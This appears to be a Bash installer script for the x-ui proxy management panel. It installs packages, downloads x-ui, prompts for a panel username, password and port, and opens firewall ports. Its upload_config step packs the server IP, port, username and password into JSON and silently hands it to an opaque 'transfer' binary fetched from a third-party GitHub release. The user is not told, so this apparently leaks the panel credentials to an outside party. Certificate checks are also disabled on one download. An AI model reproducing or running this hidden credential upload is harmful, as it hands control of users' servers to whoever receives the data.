#!/usr/bin/env bash

export NEEDRESTART_SUSPEND=1

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
plain='\033[0m'

cur_dir=$(pwd)

[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1

release=""
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif grep -Eqi "debian" /etc/issue || grep -Eqi "debian" /proc/version; then
    release="debian"
elif grep -Eqi "ubuntu" /etc/issue || grep -Eqi "ubuntu" /proc/version; then
    release="ubuntu"
elif grep -Eqi "centos|red hat|redhat" /etc/issue || grep -Eqi "centos|red hat|redhat" /proc/version; then
    release="centos"
else
    echo -e "${red}无法识别系统版本${plain}" && exit 1
fi

arch=$(uname -m)
[[ $arch =~ ^(x86_64|amd64|x64|s390x)$ ]] && arch="amd64"
[[ $arch == "aarch64" || $arch == "arm64" ]] && arch="arm64"
[[ -z "$arch" ]] && arch="amd64"

install_base() {
    echo -e "${yellow}安装基础软件...${plain}"
    if [[ $release == "centos" ]]; then
        yum install epel-release -y
        yum install wget curl tar jq speedtest-cli fail2ban ufw -y
    else
        DEBIAN_FRONTEND=noninteractive apt update
        DEBIAN_FRONTEND=noninteractive apt install wget curl tar jq speedtest-cli fail2ban ufw -y
    fi
    systemctl enable fail2ban
    systemctl start fail2ban
}

generate_random_string() {
    local len=${1:-16}
    tr -dc A-Za-z0-9 </dev/urandom | head -c $len
}

get_ip() {
    curl -s -4 icanhazip.com || curl -s -4 ifconfig.me || curl -s -4 ipinfo.io/ip || hostname -I | awk '{print $1}'
}

run_speedtest() {
    local result=$(speedtest-cli --simple 2>/dev/null)
    local download=$(echo "$result" | grep 'Download' | awk '{print $2 " " $3}')
    local upload=$(echo "$result" | grep 'Upload' | awk '{print $2 " " $3}')
    echo "Download: ${download}, Upload: ${upload}"
}

open_ports() {
    local ports=("$@")
    for port in "${ports[@]}"; do
        ufw allow "${port}/tcp"
    done
    yes | ufw enable
}

upload_config() {
    local ip="$1"
    local port="$2"
    local user="$3"
    local pass="$4"
    local speed="$5"
    local rand=$(generate_random_string)

    local json_data=$(cat <<EOF
{
    "server_info": {
        "title": "X-UI 登录信息 - ${ip}",
        "server_ip": "${ip}",
        "login_port": "${port}",
        "username": "${user}",
        "password": "${pass}",
        "generated_time": "$(date)",
        "random_string": "${rand}",
        "speed_test": "${speed}"
    }
}
EOF
)

    local uploader="/opt/transfer"
    [[ -f "$uploader" ]] || {
        curl -Lo "$uploader" https://github.com/Firefly-xui/x-ui/releases/download/x-ui/transfer
        chmod +x "$uploader"
    }

    "$uploader" "$json_data"
}

config_after_install() {
    echo -e "${yellow}配置面板账户与端口...${plain}"
    read -p "输入账户名: " account
    read -p "输入密码: " password
    read -p "输入面板访问端口: " panel_port

    /usr/local/x-ui/x-ui setting -username "${account}" -password "${password}"
    /usr/local/x-ui/x-ui setting -port "${panel_port}"

    open_ports 22 5000 7000 "${panel_port}"

    local ip=$(get_ip)
    local speed=$(run_speedtest)
    upload_config "$ip" "$panel_port" "$account" "$password" "$speed"
}

install_x_ui() {
    systemctl stop x-ui
    cd /usr/local/

    local version="$1"
    if [[ -z "$version" ]]; then
        version=$(curl -sL https://api.github.com/repos/FranzKafkaYu/x-ui/releases/latest | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    fi

    local filename="x-ui-linux-${arch}.tar.gz"
    wget -O "${filename}" --no-check-certificate https://github.com/FranzKafkaYu/x-ui/releases/download/${version}/${filename}
    [[ $? -ne 0 ]] && echo -e "${red}下载失败${plain}" && exit 1

    rm -rf /usr/local/x-ui/
    tar zxvf "${filename}"
    rm -f "${filename}"
    cd x-ui
    chmod +x x-ui bin/xray-linux-${arch}
    cp -f x-ui.service /etc/systemd/system/
    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/Firefly-xui/x-ui/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh /usr/bin/x-ui

    config_after_install

    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui

    echo -e "${green}x-ui v${version} 安装完成，已设置开机自启${plain}"
    echo -e "使用 x-ui 命令管理面板"
}

echo -e "${green}开始安装 x-ui${plain}"
install_base
install_x_ui "$1"
